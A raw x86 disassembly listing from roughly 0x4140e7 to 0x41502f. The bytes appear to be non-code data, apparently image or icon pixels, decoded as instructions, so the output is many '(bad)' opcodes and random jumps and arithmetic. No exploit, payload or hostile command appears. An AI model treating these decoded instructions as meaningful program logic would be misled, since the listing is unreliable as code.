  4140e7:	(bad)  
  4140e8:	(bad)  
  4140ea:	(bad)  
  4140ec:	hlt    
  4140ed:	hlt    
  4140ee:	hlt    
  4140ef:	(bad)  
  4140f0:	(bad)  
  4140f1:	(bad)  
  4140f2:	(bad)  
  4140f3:	(bad)  
  4140f4:	(bad)  
  4140f5:	(bad)  
  4140f6:	(bad)  
  4140f7:	(bad)  
  4140f8:	sti    
  4140f9:	cli    
  4140fa:	cli    
  4140fb:	(bad)  
  4140fc:	jmp    0xd2ce:0xc5ffeaea
  414103:	call   FWORD PTR [ecx+esi*2+0x42aaff6d]
  41410a:	cmp    bh,bh
  41410c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41410d:	sub    ebx,DWORD PTR [esi]
  41410f:	call   FWORD PTR [edi-0x5400fff8]
  414115:	push   ss
  414116:	add    bh,bh
  414118:	mov    dl,0x16
  41411a:	add    bh,bh
  41411c:	mov    edx,0xc2ff001a
  414121:	sbb    al,0x0
  414123:	dec    ebx
  414125:	push   ds
  414126:	add    bh,bh
  414128:	rcr    DWORD PTR [edi],cl
  41412a:	add    bh,bh
  41412c:	fisub  DWORD PTR [edx]
  41412e:	add    bh,bh
  414130:	jecxz  0x414156
  414132:	add    bh,bh
  414134:	in     al,dx
  414135:	pop    ds
  414136:	add    bh,bh
  414138:	repz aaa 
  41413a:	adc    edi,edi
  41413c:	(bad)  
  41413d:	mov    dl,0xa2
  41413f:	(bad)  
  414140:	jmp    ebx
  414142:	fdiv   st(7),st
  414144:	(bad)  
  414145:	fcmovbe st,st(1)
  414147:	(bad)  
  414148:	(bad)  
  414149:	fcmovbe st,st(0)
  41414b:	(bad)  
  41414c:	(bad)  
  41414d:	fcmovnbe st,st(0)
  41414f:	dec    eax
  414151:	mov    ah,0xad
  414153:	push   DWORD PTR [edx-0x39004e4f]
  414159:	mov    dh,0xff
  41415c:	mov    dl,0xb0
  41415e:	scas   eax,DWORD PTR es:[edi]
  41415f:	call   ecx
  414161:	mov    ecx,0xe2ffffaf
  414166:	aad    0xff
  414168:	jmp    edx
  41416a:	(bad)  
  41416b:	(bad)  
  41416c:	jmp    ebp
  41416e:	fdivr  st,st(7)
  414170:	(bad)  
  414171:	jmp    0xc9414155
  414176:	mov    al,0xff
  414178:	call   0xe840fc45
  41417d:	out    dx,al
  41417e:	lock jmp FWORD PTR [edx-0x69005556]
  414185:	xchg   esi,eax
  414186:	xchg   esi,eax
  414187:	scas   eax,DWORD PTR es:[edi]
	...
  4141a0:	scas   eax,DWORD PTR es:[edi]
  4141a1:	mov    ah,0xb4
  4141a3:	sub    dh,BYTE PTR [ecx-0x50bf4c4d]
  4141a9:	mov    al,0xb0
  4141ab:	mov    DWORD PTR [edx-0x37004344],edi
  4141b1:	retf   0xffca
  4141b4:	fcmovu st,st(3)
  4141b6:	(bad)  
  4141b8:	repz hlt 
  4141ba:	hlt    
  4141bb:	(bad)  
  4141bc:	(bad)  
  4141bd:	(bad)  
  4141be:	(bad)  
  4141bf:	call   ebp
  4141c1:	(bad)  
  4141c3:	jmp    FWORD PTR [ebx+ecx*4+0xb91ff8a]
  4141ca:	add    bh,bh
  4141cc:	sahf   
  4141cd:	(bad)  
  4141cf:	jmp    DWORD PTR [ecx+edx*1+0x15acff00]
  4141d6:	add    bh,bh
  4141d8:	mov    ch,0x17
  4141da:	add    bh,bh
  4141dc:	mov    ebp,0xc4ff0019
  4141e1:	sbb    al,0x0
  4141e3:	dec    esi
  4141e5:	push   ds
  4141e6:	add    bh,bh
  4141e8:	(bad)  
  4141e9:	and    BYTE PTR [eax],al
  4141eb:	(bad)  
  4141ec:	fsub   QWORD PTR [ebx]
  4141ee:	add    bh,bh
  4141f0:	out    0x24,al
  4141f2:	add    bh,bh
  4141f4:	out    dx,al
  4141f5:	sbb    al,0x0
  4141f7:	(bad)  
  4141f8:	clc    
  4141f9:	push   esp
  4141fa:	xor    bh,bh
  4141fc:	call   ecx
  4141fe:	(bad)  
  4141ff:	(bad)  
  414200:	jmp    edi
  414202:	loop   0x414203
  414204:	(bad)  
  414205:	(bad)  
  414207:	(bad)  
  414208:	(bad)  
  414209:	(bad)  
  41420b:	(bad)  
  41420c:	jmp    eax
  41420e:	xlat   BYTE PTR ds:[ebx]
  41420f:	(bad)  
  414210:	cli    
  414211:	fst    st(4)
  414213:	inc    edx
  414215:	mov    dl,0xad
  414217:	(bad)  
  414218:	mov    esp,0xb9ffb5b8
  41421d:	scas   al,BYTE PTR es:[edi]
  41421e:	test   eax,0xcdd7edff
  414223:	(bad)  
  414224:	jmp    edi
  414226:	(bad)  
  414228:	jmp    edi
  41422a:	fdivp  st(7),st
  41422c:	(bad)  
  41422d:	jmp    0xee414210
  414232:	out    0xff,al
  414234:	call   ebp
  414236:	sar    edi,0xe9
  414239:	(bad)  
  41423a:	mov    eax,0xf5f2eeff
  41423f:	(bad)  
  414240:	mov    ecx,0x93ffb9b9
  414245:	xchg   ebx,eax
  414246:	xchg   ebx,eax
  414247:	mov    BYTE PTR [eax],0x0
	...
  41426a:	add    BYTE PTR [eax],al
  41426c:	scas   eax,DWORD PTR es:[edi]
  41426d:	mov    dl,0xb2
  41426f:	sbb    eax,0x3db3b3b1
  414274:	scas   eax,DWORD PTR es:[edi]
  414275:	mov    bl,0xb2
  414277:	cwde   
  414278:	mov    ecx,0xc6ffbbbb
  41427d:	mov    edi,0xd7d5ceff
  414283:	push   DWORD PTR [ecx-0x79006766]
  414289:	add    BYTE PTR [eax],al
  41428b:	call   FWORD PTR [ebp-0x5900fff6]
  414291:	adc    eax,0x15aeff00
  414296:	add    bh,bh
  414298:	mov    bh,0x17
  41429a:	add    bh,bh
  41429c:	mov    esi,0xc6ff001b
  4142a1:	sbb    al,0x0
  4142a3:	call   eax
  4142a5:	pop    ds
  4142a6:	add    bh,bh
  4142a8:	fsub   DWORD PTR [edx]
  4142aa:	add    bh,bh
  4142ac:	fisub  WORD PTR [ebx]
  4142ae:	add    bh,bh
  4142b0:	call   0xf14042d8
  4142b5:	and    BYTE PTR [eax],al
  4142b7:	(bad)  
  4142b8:	cli    
  4142b9:	jb     0x414311
  4142bb:	(bad)  
  4142bc:	jmp    ebx
  4142be:	fdivp  st(7),st
  4142c0:	jmp    edi
  4142c2:	loope  0x4142c3
  4142c4:	jmp    esp
  4142c6:	(bad)  
  4142c8:	jmp    esp
  4142ca:	fdiv   st(7),st
  4142cc:	jmp    esp
  4142ce:	fdiv   st(7),st
  4142d0:	jmp    esi
  4142d2:	(bad)  
  4142d4:	(bad)  
  4142d5:	call   0xea4142b8
  4142da:	(bad)  
  4142dc:	(bad)  
  4142dd:	jmp    0xec4142c2
  4142e2:	in     al,0xff
  4142e4:	(bad)  
  4142e5:	in     eax,dx
  4142e6:	in     eax,0xff
  4142e8:	(bad)  
  4142e9:	out    dx,eax
  4142ea:	call   0xea3142ee
  4142ef:	(bad)  
  4142f0:	push   ebp
  4142f2:	lock (bad) 
  4142f4:	jmp    ebx
  4142f6:	aam    0xff
  4142f8:	jmp    0x4142c0
  4142fa:	mov    ch,0xff
  4142fc:	repnz cmc 
  4142fe:	idiv   edi
  414300:	(bad)  
  414301:	(bad)
  414304:	xchg   edx,eax
  414305:	xchg   edx,eax
  414306:	xchg   edx,eax
  414307:	ficomp DWORD PTR [ebx+0xf9b9b]
	...
  414335:	add    BYTE PTR [eax],al
  414337:	add    BYTE PTR [ebx-0x53f3494a],dh
  41433d:	mov    al,0xb0
  41433f:	and    edi,DWORD PTR [edx+eax*8-0x544d243b]
  414346:	test   eax,0x986ff
  41434b:	jmp    DWORD PTR [ecx-0x5800fff9]
  414351:	adc    eax,0x16afff00
  414356:	add    bh,bh
  414358:	mov    eax,0xbfff0018
  41435d:	sbb    al,BYTE PTR [eax]
  41435f:	dec    eax
  414361:	sbb    eax,0x1fd2ff00
  414366:	add    bh,bh
  414368:	(bad)  [ecx]
  41436a:	add    bh,bh
  41436c:	loope  0x414392
  41436e:	add    bh,bh
  414370:	jmp    0x25:0xf3ff0022
  414377:	(bad)  
  414378:	(bad)  
  414379:	xchg   ebp,eax
  41437a:	cmp    bh,0xff
  41437d:	repnz in eax,dx
  41437f:	(bad)  
  414380:	(bad)  
  414381:	jmp    0x41436a
  414383:	(bad)  
  414384:	(bad)  
  414385:	jmp    0x41436c
  414387:	(bad)  
  414388:	(bad)  
  414389:	in     eax,dx
  41438a:	out    0xff,eax
  41438c:	(bad)  
  41438d:	out    dx,al
  41438e:	jmp    0xeb324392
  414393:	(bad)  
  414394:	push   eax
  414396:	jmp    0xffff:0xe8f0ffff
  41439d:	out    dx,eax
  41439e:	jmp    0xe63043a2
  4143a3:	(bad)  
  4143a4:	(bad)  
  4143a5:	jmp    0x414387
  4143a7:	(bad)  
  4143a8:	jmp    esi
  4143aa:	fcos   
  4143ac:	(bad)  
  4143ad:	(bad)  
  4143af:	(bad)  
  4143b0:	(bad)  
  4143b1:	fcmovne st,st(4)
  4143b3:	(bad)  
  4143b4:	inc    bh
  4143b6:	lods   al,BYTE PTR ds:[esi]
  4143b7:	jmp    ebx
  4143b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143ba:	(bad)  
  4143bb:	push   edx
  4143bd:	cmc    
  4143be:	idiv   edi
  4143c0:	rcl    bl,cl
  4143c2:	sar    edi,cl
  4143c4:	lea    ecx,[ebp-0x66660f73]
  4143ca:	cdq    
  4143cb:	xor    al,0x0
	...
  4143fd:	add    BYTE PTR [eax],al
  4143ff:	add    bh,al
  414401:	into   
  414402:	shl    DWORD PTR [ebx-0x49],1
  414405:	mov    ebx,0x1b8affba
  41440a:	adc    eax,0x1a1ff
  41440f:	jmp    FWORD PTR [eax-0x4f00ffeb]
  414415:	push   ss
  414416:	add    bh,bh
  414418:	mov    ecx,0xc0ff0019
  41441d:	sbb    eax,DWORD PTR [eax]
  41441f:	dec    ecx
  414421:	push   ds
  414422:	add    bh,bh
  414424:	shl    DWORD PTR [edx],cl
  414426:	add    bh,bh
  414428:	(bad)  [eax+eax*1]
  41442b:	jmp    ebx
  41442d:	daa    
  41442e:	add    bh,bh
  414430:	in     al,dx
  414431:	and    DWORD PTR [eax],eax
  414433:	(bad)  
  414434:	clc    
  414435:	cmp    BYTE PTR [edx],dl
  414437:	(bad)  
  414438:	(bad)  
  414439:	mov    ebp,0xfdffffae
  41443e:	sti    
  41443f:	(bad)  
  414440:	(bad)  
  414441:	jmp    0x414428
  414443:	(bad)  
  414444:	jmp    esp
  414446:	(bad)  
  414448:	(bad)  
  414449:	(bad)  
  41444b:	(bad)  
  41444c:	(bad)  
  41444d:	fmul   st,st(0)
  41444f:	(bad)  
  414450:	call   edx
  414452:	mov    esi,0xb8cbfeff
  414457:	(bad)  
  414458:	std    
  414459:	(bad)  
  41445a:	mov    cl,0xff
  41445c:	inc    dl
  41445e:	test   eax,0xa0bbf7ff
  414463:	(bad)  
  414464:	out    dx,al
  414465:	mov    dh,0x9d
  414467:	(bad)  
  414468:	jmp    0xea40e422
  41446d:	mov    ebx,0xc1eaffa7
  414472:	mov    al,0xff
  414474:	in     eax,dx
  414475:	les    esi,FWORD PTR [edx-0x4a3d2101]
  41447b:	push   esi
  41447d:	clc    
  41447e:	stc    
  41447f:	(bad)  
  414480:	(bad)  
  414482:	loopne 0x414483
  414484:	xchg   esp,eax
  414485:	xchg   esp,eax
  414486:	xchg   esp,eax
  414487:	std    
  414488:	lods   al,BYTE PTR ds:[esi]
  414489:	lods   al,BYTE PTR ds:[esi]
  41448a:	lods   al,BYTE PTR ds:[esi]
  41448b:	sub    al,BYTE PTR [eax]
	...
  4144bd:	add    BYTE PTR [eax],al
  4144bf:	add    al,cl
  4144c1:	int3   
  4144c2:	into   
  4144c3:	cmp    eax,0xffc4c4b8
  4144c8:	(bad)  
  4144c9:	aaa    
  4144ca:	xor    edi,edi
  4144cc:	popf   
  4144cd:	add    BYTE PTR [eax],al
  4144cf:	jmp    FWORD PTR [ecx-0x4d00ffe9]
  4144d5:	sbb    BYTE PTR [eax],al
  4144d7:	(bad)  
  4144d8:	mov    esi,0xc5ff001b
  4144dd:	sbb    al,BYTE PTR [eax]
  4144df:	call   ecx
  4144e1:	sbb    al,BYTE PTR [eax]
  4144e3:	(bad)  
  4144e4:	fst    QWORD PTR [esi]
  4144e6:	add    bh,bh
  4144e8:	jecxz  0x4144fd
  4144ea:	add    bh,bh
  4144ec:	jmp    0xb:0xf1ff0010
  4144f3:	push   esi
  4144f5:	daa    
  4144f6:	add    bh,bh
  4144f8:	clc    
  4144f9:	mov    WORD PTR [ebp-0x1],?
  4144fc:	icebp  
  4144fd:	scas   eax,DWORD PTR es:[edi]
  4144fe:	lahf   
  4144ff:	(bad)  
  414500:	in     al,dx
  414501:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414502:	xchg   ebp,eax
  414503:	(bad)  
  414504:	jmp    0x4144ad
  414506:	xchg   ebx,eax
  414507:	jmp    esi
  414509:	test   al,0x95
  41450b:	(bad)  
  41450c:	fsubr  QWORD PTR [ebx-0x48250063]
  414512:	stos   DWORD PTR es:[edi],eax
  414513:	(bad)  
  414514:	faddp  st(1),st
  414516:	mov    bh,0xff
  414518:	in     al,0xc9
  41451a:	mov    ebp,0xbfc8e3ff
  41451f:	(bad)  
  414520:	fmul   st(0),st
  414522:	sar    bh,0xd5
  414525:	retf   0xffc4
  414528:	(bad)  
  414529:	ror    edi,1
  41452b:	(bad)  
  41452c:	fcomp  st(1)
  41452e:	fdivr  st,st(7)
  414530:	fcmovnu st,st(6)
  414532:	(bad)  
  414534:	(bad)  
  414536:	in     al,0xff
  414538:	fsubrp st(6),st
  41453a:	jmp    0xe6272b35
  41453f:	jecxz  0x41451f
  414541:	(bad)  
  414543:	mov    edi,0x62bbbbbb
	...
  414580:	ret    0xc6c3
  414583:	push   ds
  414584:	mov    ecx,0x98ffcac7
  414589:	dec    ecx
  41458a:	inc    ebp
  41458b:	call   FWORD PTR [ebp-0x55010000]
  414591:	add    eax,0x4afff00
  414596:	add    bh,bh
  414598:	mov    bh,0x7
  41459a:	add    bh,bh
  41459c:	mov    bh,0xc
  41459e:	add    bh,bh
  4145a0:	mov    edx,0xbbff011b
  4145a5:	xor    BYTE PTR [edx],bl
  4145a7:	(bad)  
  4145a8:	mov    esi,0xcaff3448
  4145ad:	pop    esi
  4145ae:	dec    ebp
  4145af:	dec    edx
  4145b1:	jne    0x41461b
  4145b3:	inc    esp
  4145b5:	nop
  4145b6:	test   edi,edi
  4145b8:	retf   0xaab0
  4145bb:	dec    esi
  4145bd:	mov    edi,0xc7cfffbd
  4145c2:	(bad)  
  4145c3:	call   ebx
  4145c5:	into   
  4145c6:	into   
  4145c7:	call   eax
  4145c9:	iret   
  4145ca:	iret   
  4145cb:	dec    edi
  4145cd:	rcl    ebx,1
  4145cf:	dec    edi
  4145d1:	rcl    ebp,cl
  4145d3:	dec    edi
  4145d5:	aad    0xd6
  4145d7:	clc    
  4145d8:	into   
  4145d9:	rcl    ebp,cl
  4145db:	icebp  
  4145dc:	into   
  4145dd:	rcl    esi,cl
  4145df:	(bad)  
  4145e1:	aad    0xd7
  4145e3:	retf   0xd9d3
  4145e6:	fld    TBYTE PTR [ecx-0x7427282d]
  4145ec:	rcl    ebp,cl
  4145ee:	fcomp  DWORD PTR [esi-0x35]
  4145f1:	int3   
  4145f2:	int    0x36
  4145f4:	rcl    cl,1
  4145f6:	rcr    DWORD PTR [edx+ebx*8],1
  4145f9:	fcmovu st,st(2)
  4145fb:	push   ss
  4145fc:	(bad)  
  4145fe:	fcom   QWORD PTR [eax]
  414600:	(bad)  
  414602:	fiadd  WORD PTR [edi]
	...
  414640:	rol    edx,0xc4
  414643:	adc    dh,BYTE PTR [esi-0x61123d42]
  414649:	jne    0x4146bb
  41464b:	inc    DWORD PTR [ebp-0x6400d6d0]
  414651:	pusha  
  414652:	pop    edx
  414653:	jmp    FWORD PTR [esi-0x4d008581]
  414659:	xchg   edx,eax
  41465a:	nop
  41465b:	push   DWORD PTR [eax-0x4a005c5c]
  414661:	mov    eax,0xc8bbffb9
  414666:	int3   
  414667:	inc    ecx
  414669:	rcl    ch,cl
  41466b:	dec    eax
  41466d:	fcomp  st(2)
  41466f:	dec    ebx
  414671:	fcmovnu st,st(4)
  414673:	dec    ebx
  414675:	fcomp  st(2)
  414677:	clc    
  414678:	retf   
  414679:	rcl    ah,cl
  41467b:	out    0xcb,eax
  41467d:	iret   
  41467e:	rcr    cl,1
  414680:	retf   
  414681:	into   
  414682:	iret   
  414683:	leave  
  414684:	leave  
  414685:	int    0xce
  414687:	stos   DWORD PTR es:[edi],eax
  414688:	int    0xcf
  41468a:	rcl    BYTE PTR [eax+0x75d0cecd],1
  414690:	into   
  414691:	into   
  414692:	into   
  414693:	inc    ebp
  414694:	leave  
  414695:	retf   
  414696:	retf   0xc828
  414699:	enter  0x9c8,0x0
	...
  4146fd:	add    BYTE PTR [eax],al
  4146ff:	add    BYTE PTR [eax-0x4dee5459],ch
  414705:	mov    cl,0xb3
  414707:	in     eax,0xc0
  414709:	leave  
  41470a:	retf   0xbcff
  41470d:	int3   
  41470e:	iret   
  41470f:	inc    esp
  414711:	rcl    dh,cl
  414713:	inc    ebp
  414715:	rcl    esp,1
  414717:	test   bh,0xcf
  41471a:	shr    al,cl
  41471c:	leave  
  41471d:	iret   
  41471e:	rcl    ah,1
  414720:	enter  0xcbcb,0xbe
  414724:	enter  0xcbc9,0xab
  414728:	(bad)  
  414729:	enter  0x92c8,0xc9
  41472d:	retf   0x72ca
  414730:	leave  
  414731:	leave  
  414732:	leave  
  414733:	pop    eax
  414734:	retf   
  414735:	retf   
  414736:	int3   
  414737:	aaa    
  414738:	retf   0xcaca
  41473b:	sbb    BYTE PTR [eax],al
	...
  4147bd:	add    BYTE PTR [eax],al
  4147bf:	add    BYTE PTR [ebx-0x58fb6065],bl
  4147c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147c6:	test   eax,0xc4c2c466
  4147cb:	nop
  4147cc:	sar    BYTE PTR [esi-0x44448641],0xbd
  4147d3:	pop    edx
  4147d4:	mov    edi,0xc33dbfbd
  4147d9:	ret    
  4147da:	ret    
  4147db:	daa    
  4147dc:	enter  0xc9c8,0xc
	...
  414884:	stos   DWORD PTR es:[edi],eax
  414885:	stos   DWORD PTR es:[edi],eax
  414886:	lods   eax,DWORD PTR ds:[esi]
  414887:	or     dl,dl
  414889:	rcl    edx,1
  41488b:	(bad)  
  41488d:	ret    0x3c3
  414890:	mov    ebx,0x1bdbb
	...
  414b4d:	add    BYTE PTR [eax],al
  414b4f:	add    bh,bh
  414b51:	(bad)  
  414b52:	(bad)  
  414b53:	(bad)  
  414b54:	(bad)  
  414b55:	inc    DWORD PTR [eax]
  414b57:	add    bh,bh
  414b59:	(bad)  
  414b5a:	(bad)  
  414b5b:	(bad)  
  414b5c:	(bad)  
  414b5d:	inc    DWORD PTR [eax]
  414b5f:	add    bh,bh
  414b61:	(bad)  
  414b62:	(bad)  
  414b63:	(bad)  
  414b64:	(bad)  
  414b65:	inc    DWORD PTR [eax]
  414b67:	add    bh,bh
  414b69:	(bad)  
  414b6a:	cld    
  414b6b:	add    BYTE PTR [edi],bl
  414b6d:	inc    DWORD PTR [eax]
  414b6f:	add    bh,bh
  414b71:	push   eax
  414b73:	add    BYTE PTR [edi],al
  414b75:	pop    DWORD PTR [eax]
  414b77:	add    bh,bh
  414b79:	jmp    eax
  414b7b:	add    BYTE PTR [ecx],al
  414b7d:	add    DWORD PTR [eax],eax
  414b7f:	add    bh,bh
  414b81:	inc    eax
  414b83:	add    BYTE PTR [eax],al
  414b85:	add    BYTE PTR [eax],al
  414b87:	add    bh,bh
  414b89:	inc    DWORD PTR [eax+0x0]
  414b8f:	add    bh,bh
  414b91:	inc    DWORD PTR [eax+0x0]
  414b97:	add    bh,bh
  414b99:	inc    DWORD PTR [eax+0x0]
  414b9f:	add    bh,bh
  414ba1:	inc    DWORD PTR [eax+0x0]
  414ba7:	add    al,al
  414ba9:	pop    es
  414baa:	add    BYTE PTR [eax],0x0
  414bad:	add    BYTE PTR [eax],al
  414baf:	add    BYTE PTR [eax+0xc001],al
  414bb5:	add    BYTE PTR [eax],al
  414bb7:	add    BYTE PTR [eax+0x7000],al
  414bbd:	sldt   WORD PTR [eax]
  414bc0:	add    BYTE PTR [eax],0xc
  414bc3:	add    BYTE PTR [eax],al
  414bc5:	sldt   WORD PTR [eax]
  414bc8:	add    BYTE PTR [eax],0x0
  414bcb:	add    BYTE PTR [eax],al
  414bcd:	sldt   WORD PTR [eax]
  414bd0:	add    BYTE PTR [eax],0x0
  414bd3:	add    BYTE PTR [eax],al
  414bd5:	sldt   WORD PTR [eax]
  414bd8:	add    BYTE PTR [eax],0x0
  414bdb:	add    BYTE PTR [eax],al
  414bdd:	sldt   WORD PTR [eax]
  414be0:	add    BYTE PTR [eax],0x0
  414be3:	add    BYTE PTR [eax],al
  414be5:	sldt   WORD PTR [eax]
  414be8:	add    BYTE PTR [eax],0x0
  414beb:	add    BYTE PTR [eax],al
  414bed:	sldt   WORD PTR [eax]
  414bf0:	add    BYTE PTR [eax],0x0
  414bf3:	add    BYTE PTR [eax],al
  414bf5:	sldt   WORD PTR [eax]
  414bf8:	add    BYTE PTR [eax],0x0
  414bfb:	add    BYTE PTR [eax],al
  414bfd:	pop    es
  414bfe:	add    BYTE PTR [eax],al
  414c00:	add    BYTE PTR [eax],0x0
  414c03:	add    BYTE PTR [eax],al
  414c05:	pop    es
  414c06:	add    BYTE PTR [eax],al
  414c08:	add    BYTE PTR [eax],0x0
  414c0b:	add    BYTE PTR [eax],al
  414c0d:	pop    es
  414c0e:	add    BYTE PTR [eax],al
  414c10:	add    BYTE PTR [eax],0x0
  414c13:	add    BYTE PTR [eax],al
  414c15:	pop    es
  414c16:	add    BYTE PTR [eax],al
  414c18:	add    BYTE PTR [eax],0x0
  414c1b:	add    BYTE PTR [eax],al
  414c1d:	pop    es
  414c1e:	add    BYTE PTR [eax],al
  414c20:	add    BYTE PTR [eax],0x0
  414c23:	add    BYTE PTR [eax],al
  414c25:	pop    es
  414c26:	add    BYTE PTR [eax],al
  414c28:	add    BYTE PTR [eax],0x0
  414c2b:	add    BYTE PTR [eax],al
  414c2d:	pop    es
  414c2e:	add    BYTE PTR [eax],al
  414c30:	add    BYTE PTR [eax],0x0
  414c33:	add    BYTE PTR [eax],al
  414c35:	pop    es
  414c36:	add    BYTE PTR [eax],al
  414c38:	add    BYTE PTR [eax],0x0
  414c3b:	add    BYTE PTR [eax],al
  414c3d:	add    eax,DWORD PTR [eax]
  414c3f:	add    BYTE PTR [eax+0x0],al
  414c45:	add    eax,DWORD PTR [eax]
  414c47:	add    BYTE PTR [eax+0x0],al
  414c4d:	add    eax,DWORD PTR [eax]
  414c4f:	add    BYTE PTR [eax+0x0],al
  414c55:	add    eax,DWORD PTR [eax]
  414c57:	add    BYTE PTR [eax+0x0],al
  414c5d:	add    eax,DWORD PTR [eax]
  414c5f:	add    al,al
  414c61:	add    BYTE PTR [eax],al
  414c63:	add    BYTE PTR [eax],al
  414c65:	add    eax,DWORD PTR [eax]
  414c67:	add    al,dh
  414c69:	add    BYTE PTR [eax],al
  414c6b:	add    BYTE PTR [eax],al
  414c6d:	add    eax,DWORD PTR [eax]
  414c6f:	add    dh,bh
  414c71:	add    BYTE PTR [eax],al
  414c73:	add    BYTE PTR [eax],al
  414c75:	add    DWORD PTR [eax],eax
  414c77:	add    bh,bh
  414c79:	rol    BYTE PTR [eax],0x0
  414c7c:	add    BYTE PTR [ecx],al
  414c7e:	add    BYTE PTR [eax],al
  414c80:	push   eax
  414c82:	add    BYTE PTR [eax],al
  414c84:	add    BYTE PTR [ecx],al
  414c86:	add    BYTE PTR [eax],al
  414c88:	push   eax
  414c8a:	add    BYTE PTR [eax],al
  414c8c:	add    BYTE PTR [ebx],al
  414c8e:	add    BYTE PTR [eax],al
  414c90:	push   eax
  414c92:	add    BYTE PTR [eax],al
  414c94:	add    BYTE PTR [edi],al
  414c96:	add    BYTE PTR [eax],al
  414c98:	push   eax
  414c9a:	add    BYTE PTR [eax],al
  414c9c:	pop    ds
  414c9d:	inc    DWORD PTR [eax]
  414c9f:	add    bh,bh
  414ca1:	lock add BYTE PTR [edi],bl
  414ca4:	(bad)  
  414ca5:	inc    DWORD PTR [eax]
  414ca7:	add    bh,bh
  414ca9:	lock ud0 edi,edi
  414cad:	inc    DWORD PTR [eax]
  414caf:	add    bh,bh
  414cb1:	clc    
  414cb2:	jg     0x414cb3
  414cb4:	(bad)  
  414cb5:	inc    DWORD PTR [eax]
  414cb7:	add    bh,bh
  414cb9:	(bad)  
  414cba:	(bad)  
  414cbb:	(bad)  
  414cbc:	(bad)  
  414cbd:	inc    DWORD PTR [eax]
  414cbf:	add    bh,bh
  414cc1:	(bad)  
  414cc2:	(bad)  
  414cc3:	(bad)  
  414cc4:	(bad)  
  414cc5:	inc    DWORD PTR [eax]
  414cc7:	add    bh,bh
  414cc9:	(bad)  
  414cca:	(bad)  
  414ccb:	(bad)  
  414ccc:	(bad)  
  414ccd:	inc    DWORD PTR [eax]
  414ccf:	add    BYTE PTR [eax],ch
  414cd1:	add    BYTE PTR [eax],al
  414cd3:	add    BYTE PTR [eax],ah
  414cd5:	add    BYTE PTR [eax],al
  414cd7:	add    BYTE PTR [eax+0x0],al
  414cda:	add    BYTE PTR [eax],al
  414cdc:	add    DWORD PTR [eax],eax
  414cde:	and    BYTE PTR [eax],al
  414ce0:	add    BYTE PTR [eax],al
  414ce2:	add    BYTE PTR [eax],al
  414ce4:	adc    BYTE PTR [eax],0x0
	...
  414e33:	add    BYTE PTR [eax-0x47fb4f50],dh
  414e39:	mov    eax,0xaaaa4ab8
  414e3e:	stos   BYTE PTR es:[edi],al
  414e3f:	xchg   BYTE PTR [esi-0x4669494a],dh
  414e45:	mov    ecx,0xa1a195b9
  414e4a:	mov    eax,ds:0x81818195
  414e4f:	xchg   DWORD PTR [edi+0x77],esi
  414e52:	ja     0x414ea2
  414e54:	jbe    0x414ecc
  414e56:	jbe    0x414e5e
	...
  414eb0:	sahf   
  414eb1:	sahf   
  414eb2:	sahf   
  414eb3:	fs mov edi,0xd5d5d9c7
  414eba:	aad    0xff
  414ebc:	fstp   st(5)
  414ebe:	(bad)  
  414ec0:	loop   0x414ea4
  414ec2:	loop   0x414ec3
  414ec4:	fcmovu st,st(2)
  414ec6:	(bad)  
  414ec8:	(bad)  
  414ec9:	(bad)  
  414eca:	(bad)  
  414ecb:	(bad)  
  414ecc:	(bad)  
  414ece:	fdiv   st(7),st
  414ed0:	enter  0xc8c8,0xff
  414ed4:	mov    ds:0x97bda2a2,al
  414ed9:	xchg   edi,eax
  414eda:	xchg   edi,eax
  414edb:	pop    edi
	...
  414ee8:	add    BYTE PTR [eax],al
  414eea:	add    BYTE PTR [edx],al
  414eec:	add    BYTE PTR [eax],al
  414eee:	add    BYTE PTR [ecx],al
	...
  414f28:	xchg   edi,eax
  414f29:	xchg   edi,eax
  414f2a:	xchg   edi,eax
  414f2b:	or     ebp,DWORD PTR [edi-0x26185051]
  414f31:	(bad)  
  414f33:	(bad)  
  414f34:	(bad)  
  414f36:	fcos   
  414f38:	(bad)  
  414f3a:	fdiv   st(7),st
  414f3c:	loopne 0x414f1e
  414f3e:	loopne 0x414f3f
  414f40:	(bad)  
  414f42:	(bad)  
  414f44:	rcl    al,1
  414f46:	sar    bh,1
  414f48:	iret   
  414f49:	iret   
  414f4a:	iret   
  414f4b:	(bad)  
  414f4c:	jmp    0xcdcd:0xcdffeaea
  414f53:	dec    esi
  414f55:	into   
  414f56:	into   
  414f57:	call   eax
  414f59:	rcl    al,1
  414f5b:	jmp    DWORD PTR [eax+0x1daca0a0]
  414f61:	sbb    eax,0x361d
  414f66:	add    BYTE PTR [ecx],cl
  414f68:	add    BYTE PTR [eax],al
  414f6a:	add    BYTE PTR [ecx],ch
  414f6c:	add    BYTE PTR [eax],al
  414f6e:	add    BYTE PTR [esi],dl
  414f70:	add    BYTE PTR [eax],al
  414f72:	add    BYTE PTR [eax+eax*1],al
	...
  414fa5:	add    BYTE PTR [eax],al
  414fa7:	add    BYTE PTR [ebx-0x2c184c4d],dh
  414fad:	rcl    ebx,cl
  414faf:	inc    edi
  414fb1:	mov    edi,0xc8c8c8ff
  414fb7:	call   esp
  414fb9:	aam    0xd4
  414fbb:	(bad)  
  414fbc:	(bad)  
  414fbe:	(bad)  
  414fc0:	loope  0x414fa3
  414fc2:	loope  0x414fc3
  414fc4:	rcl    dl,cl
  414fc6:	sar    bh,cl
  414fc8:	iret   
  414fc9:	iret   
  414fca:	iret   
  414fcb:	(bad)  
  414fcc:	fcmovu st,st(2)
  414fce:	(bad)  
  414fd0:	mov    ebp,0xc3ffbdbd
  414fd5:	ret    
  414fd6:	ret    
  414fd7:	push   DWORD PTR [esi-0x3a00494a]
  414fdd:	(bad)
  414fe0:	mov    al,0xb0
  414fe2:	mov    al,0xff
  414fe4:	add    BYTE PTR [eax],al
  414fe6:	add    BYTE PTR [eax+eax*1+0x0],dl
  414fea:	add    BYTE PTR [edx],bh
  414fec:	add    BYTE PTR [eax],al
  414fee:	add    BYTE PTR [esi],ch
  414ff0:	add    BYTE PTR [eax],al
  414ff2:	add    BYTE PTR [edi],dl
  414ff4:	add    BYTE PTR [eax],al
  414ff6:	add    BYTE PTR [edx],cl
	...
  415024:	stos   BYTE PTR es:[edi],al
  415025:	stos   BYTE PTR es:[edi],al
  415026:	stos   BYTE PTR es:[edi],al
  415027:	cs mov ebp,0xb7ffbdbd
  41502d:	mov    bh,0xb7
  41502f:	(bad)  
